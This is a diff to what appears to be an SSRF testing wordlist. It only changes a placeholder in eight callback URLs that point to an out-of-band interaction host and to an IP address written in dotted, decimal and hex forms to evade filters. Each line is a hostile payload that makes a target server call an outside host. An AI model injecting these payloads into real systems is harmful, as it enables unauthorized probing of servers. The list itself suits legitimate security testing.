@@ -1,8 +1,8 @@
-http://ssrfpoc.callback.collabxyz.net:80/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://ssrfpoc.callback.collabxyz.net:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://64.225.102.172:80/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://64.225.102.172:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://1088513708/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://1088513708:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://0x40E166AC/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
-http://0x40E166AC:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/~~ID_BASE64~~
+http://ssrfpoc.callback.collabxyz.net:80/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://ssrfpoc.callback.collabxyz.net:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://64.225.102.172:80/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://64.225.102.172:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://1088513708/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://1088513708:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://0x40E166AC/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
+http://0x40E166AC:443/skfghoiefjladsnfksbdfvsdfnkjsdfb/ssrf/ID_BASE64
